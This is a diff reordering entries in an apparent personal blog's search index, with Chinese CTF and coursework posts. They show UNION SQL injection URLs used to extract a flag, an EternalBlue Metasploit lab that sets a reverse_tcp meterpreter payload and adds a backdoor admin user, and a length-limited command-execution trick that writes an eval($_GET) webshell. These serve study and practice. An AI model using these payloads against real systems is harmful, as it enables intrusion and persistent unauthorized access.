@@ -381,49 +381,6 @@ http:<span class="hljs-regexp">//</span>www.baidu.com:<span class="hljs-number">
       </tags>
   </entry>
   <entry>
-    <title>guestbook</title>
-    <url>/2020/04/18/Guestbook/</url>
-    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span>
-<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
-<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
-<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span>
-<span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre>
-<p>3被回显</p>
-<p>1.查看数据库名</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre>
-
-<p>数据库的名字<code>g8</code></p>
-<p>2.查看表名</p>
-<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-<p>发现有一个表 <code>flag</code></p>
-<p>3.测试表的字段</p>
-<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-<p>仍然显示<code>flag</code></p>
-<p>4.读取flag   </p>
-<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-
-<p>得到flag!</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI</title>
-    <url>/2020/08/16/SSTI/</url>
-    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>STTI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>UNCTF</title>
     <url>/2020/11/17/UNCTF/</url>
     <content><![CDATA[<p>比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。</p>
@@ -728,6 +685,49 @@ getVars();
       </categories>
       <tags>
         <tag>ssrf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>guestbook</title>
+    <url>/2020/04/18/Guestbook/</url>
+    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span>
+<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
+<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span>
+<span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre>
+<p>3被回显</p>
+<p>1.查看数据库名</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre>
+
+<p>数据库的名字<code>g8</code></p>
+<p>2.查看表名</p>
+<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+<p>发现有一个表 <code>flag</code></p>
+<p>3.测试表的字段</p>
+<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+<p>仍然显示<code>flag</code></p>
+<p>4.读取flag   </p>
+<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+
+<p>得到flag!</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI</title>
+    <url>/2020/08/16/SSTI/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>STTI</tag>
       </tags>
   </entry>
   <entry>
@@ -1807,6 +1807,66 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
       </tags>
   </entry>
   <entry>
+    <title>网安作业1</title>
+    <url>/2020/09/27/homework/</url>
+    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>
+
+<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
+<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
+<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
+<p>测试两台主机之间的通信情况</p>
+<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
+<p>使用msf前需要开启postgresql服务 </p>
+<p>开启服务：service postgresql start </p>
+<p>查看服务状态：service postgresql status</p>
+<p>开到绿色字体的active即为开启了</p>
+<p>初始化数据库：msfdb init </p>
+<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
+<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
+<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
+<p>输入search　MS17-010</p>
+<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
+<p>运行</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>
+
+<p>输入 show options  查看需要配置哪些信息</p>
+<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
+<p>RPORT 为目标端口号(445)</p>
+<p>LHOST 为监听主机IP(10.1.1.1)</p>
+<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
+<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
+<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
+<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>
+
+
+
+<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
+<p>成功获取shell</p>
+<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
+<p>查看ip地址验证是否为目标主机。</p>
+<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
+<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
+<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>
+
+<p>Username:test </p>
+<p>password:abc123.com</p>
+<p>将该用户加入管理员组，使其拥有管理员权限</p>
+<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>
+
+<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
+<p>目标主机上用户创建成功</p>
+<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
+<p>  <strong>实验结束</strong></p>
+]]></content>
+      <categories>
+        <category>网安作业</category>
+      </categories>
+      <tags>
+        <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>flask</title>
     <url>/2021/02/08/flask/</url>
     <content><![CDATA[<p>flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路</p>
@@ -2189,66 +2249,6 @@ POST:h=<span class="hljs-keyword">cat</span> <span class="hljs-keyword">f</span>
       <categories>
         <category>随笔</category>
       </categories>
-  </entry>
-  <entry>
-    <title>网安作业1</title>
-    <url>/2020/09/27/homework/</url>
-    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>
-
-<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
-<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
-<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
-<p>测试两台主机之间的通信情况</p>
-<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
-<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
-<p>使用msf前需要开启postgresql服务 </p>
-<p>开启服务：service postgresql start </p>
-<p>查看服务状态：service postgresql status</p>
-<p>开到绿色字体的active即为开启了</p>
-<p>初始化数据库：msfdb init </p>
-<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
-<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
-<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
-<p>输入search　MS17-010</p>
-<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
-<p>运行</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>
-
-<p>输入 show options  查看需要配置哪些信息</p>
-<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
-<p>RPORT 为目标端口号(445)</p>
-<p>LHOST 为监听主机IP(10.1.1.1)</p>
-<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
-<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
-<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
-<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>
-
-
-
-<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
-<p>成功获取shell</p>
-<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
-<p>查看ip地址验证是否为目标主机。</p>
-<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
-<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
-<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>
-
-<p>Username:test </p>
-<p>password:abc123.com</p>
-<p>将该用户加入管理员组，使其拥有管理员权限</p>
-<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>
-
-<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
-<p>目标主机上用户创建成功</p>
-<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
-<p>  <strong>实验结束</strong></p>
-]]></content>
-      <categories>
-        <category>网安作业</category>
-      </categories>
-      <tags>
-        <tag>msf</tag>
-      </tags>
   </entry>
   <entry>
     <title>jdtest</title>
@@ -2941,114 +2941,6 @@ var_dump(<span class="hljs-keyword">$this</span>);
       </categories>
   </entry>
   <entry>
-    <title>rce</title>
-    <url>/2020/11/29/rce/</url>
-    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
-<span id="more"></span>
-
-<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
-<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
-<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
-
-
-
-<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre>
-
-
-
-<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><pre><code class="hljs gams">exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
-<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
-<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
-
-
-
-<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
-<p>例如</p>
-<pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);
-<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>);
-<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;hello!&#x27;;&quot;</span>);
-
-<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre>
-
-
-
-<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php">php官方手册</a></p>
-<p>用法如下</p>
-<pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;system&#x27;</span><span class="hljs-comment">;</span>
-$b = <span class="hljs-string">&#x27;dir&#x27;</span><span class="hljs-comment">;</span>
-$c = <span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span>
-$d = <span class="hljs-string">&#x27;phpinfo()&#x27;</span><span class="hljs-comment">;</span>
-call_user_func($a,$b)<span class="hljs-comment">;</span>
-call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre>
-
-<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><pre><code class="hljs php"><span class="hljs-variable">$a</span> = create_function(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
-<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;
-<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);
-<span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
-<span class="hljs-variable">$b</span> = create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
-<span class="hljs-variable">$b</span>();
-
-<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"><span class="hljs-variable">$b</span></span>)</span>&#123;
-	<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$b&#x27;</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;
-    phpinfo();
-&#125;
-</code></pre>
-
-
-
-<h1 id="限制字符长度的命令执行"><a href="#限制字符长度的命令执行" class="headerlink" title="限制字符长度的命令执行"></a>限制字符长度的命令执行</h1><p>实验环境为ubuntu nginx+php5.5</p>
-<p>实验目的</p>
-<p>通过命令执行想服务器写入一句话木马而达到控制服务器的目的</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-highlight_file(<span class="hljs-keyword">__FILE__</span>);
-<span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;=<span class="hljs-number">15</span>)&#123;
-    <span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
-    <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);
-&#125;
-<span class="hljs-keyword">else</span>&#123;
-    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;It&#x27;s too long!&quot;</span>);
-&#125;
-<span class="hljs-meta">?&gt;</span></code></pre>
-
-<p>限制了参数1的字符长度为15</p>
-<p>然后将传递的参数放到shell_exec中执行</p>
-<p>突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。</p>
-<p>所以想要够的payload的为</p>
-<pre><code class="hljs url">?1&#x3D;echo shellcode &gt;1.php</code></pre>
-
-<p>将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求</p>
-<p><img src="https://i.loli.net/2020/11/29/JoPC8xrVBXQOqmE.png" alt="muma.png"></p>
-<p>可以使用<code>echo text &gt;&gt;tmp.txt</code></p>
-<p>将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行</p>
-<p>例如下面</p>
-<p><img src="https://i.loli.net/2020/11/29/L8A1xjieg6m9bGk.png" alt="echo.png"></p>
-<p>字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的</p>
-<p><img src="https://i.loli.net/2020/11/29/HWEXFrRjaDGp726.png" alt="yanzheng.png"></p>
-<p>下面就可以做这个题目了</p>
-<pre><code class="hljs php"><span class="hljs-comment">//为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \&lt;\?php &gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>\( &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \<span class="hljs-variable">$_GET</span> &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \[<span class="hljs-number">1</span>\] &gt;&gt;<span class="hljs-number">1</span>
-?<span class="hljs-number">1</span>=<span class="hljs-keyword">echo</span> \)\; &gt;&gt;<span class="hljs-number">1</span> 
-?<span class="hljs-number">1</span>=mv <span class="hljs-number">1</span> <span class="hljs-number">1.</span>php</code></pre>
-
-<p>之后访问1.php提交参数，获取想要的内容。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>cmd</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python安全攻防</title>
     <url>/2021/08/16/python%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/</url>
     <content><![CDATA[<h1 id="多线程爆破账号密码"><a href="#多线程爆破账号密码" class="headerlink" title="多线程爆破账号密码"></a>多线程爆破账号密码</h1><p>文件目录</p>
@@ -3276,6 +3168,114 @@ BLOCK_SIZE = <span class="hljs-number">1000</span>
       <categories>
         <category>python</category>
       </categories>
+  </entry>
+  <entry>
+    <title>rce</title>
+    <url>/2020/11/29/rce/</url>
+    <content><![CDATA[<p>看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。</p>
+<span id="more"></span>
+
+<h1 id="php中存在命令执行的常见函数"><a href="#php中存在命令执行的常见函数" class="headerlink" title="php中存在命令执行的常见函数"></a>php中存在命令执行的常见函数</h1><h2 id="1-system"><a href="#1-system" class="headerlink" title="1.system"></a>1.system</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line = system(&#x27;ls&#x27;, $return_var);</span>
+<span class="hljs-keyword">system</span>() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上.
+<span class="hljs-meta"><span class="hljs-meta-keyword">$last</span>_line: 只能取得最后一行的内容</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
+
+
+
+<h2 id="2-shell-exec"><a href="#2-shell-exec" class="headerlink" title="2.shell_exec"></a>2.shell_exec</h2><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-meta-keyword">$output</span> = shell_exec(&#x27;ls&#x27;);</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</span></code></pre>
+
+
+
+<h2 id="3-exec"><a href="#3-exec" class="headerlink" title="3.exec"></a>3.exec</h2><pre><code class="hljs gams">exec(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-symbol">$</span>output, <span class="hljs-symbol">$</span>return_var);
+<span class="hljs-meta"><span class="hljs-meta-keyword">$output</span>: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上.</span>
+<span class="hljs-meta"><span class="hljs-meta-keyword">$return</span>_var: 取得系统状态回传码</span></code></pre>
+
+
+
+<h2 id="3-eval"><a href="#3-eval" class="headerlink" title="3.eval"></a>3.eval</h2><p>eval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行</p>
+<p>例如</p>
+<pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;phpinfo();&quot;</span>);
+<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;dir&#x27;);&quot;</span>);
+<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo &#x27;hello!&#x27;;&quot;</span>);
+
+<span class="hljs-comment">//注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则</span></code></pre>
+
+
+
+<h2 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4.create_function"></a>4.create_function</h2><p><a href="https://www.php.net/manual/zh/function.create-function.php">php官方手册</a></p>
+<p>用法如下</p>
+<pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;system&#x27;</span><span class="hljs-comment">;</span>
+$b = <span class="hljs-string">&#x27;dir&#x27;</span><span class="hljs-comment">;</span>
+$c = <span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span>
+$d = <span class="hljs-string">&#x27;phpinfo()&#x27;</span><span class="hljs-comment">;</span>
+call_user_func($a,$b)<span class="hljs-comment">;</span>
+call_user_func($c,$d)<span class="hljs-comment">;</span></code></pre>
+
+<h2 id="5-call-user-func"><a href="#5-call-user-func" class="headerlink" title="5.call_user_func"></a>5.call_user_func</h2><pre><code class="hljs php"><span class="hljs-variable">$a</span> = create_function(<span class="hljs-string">&#x27;$code&#x27;</span>,<span class="hljs-string">&#x27;echo $code;&#x27;</span>);
+<span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;hello&#x27;</span>;
+<span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);
+<span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;
+<span class="hljs-variable">$b</span> = create_function(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$a</span>);
+<span class="hljs-variable">$b</span>();
+
+<span class="hljs-comment">//和下面两个定义的函数作用相同</span>
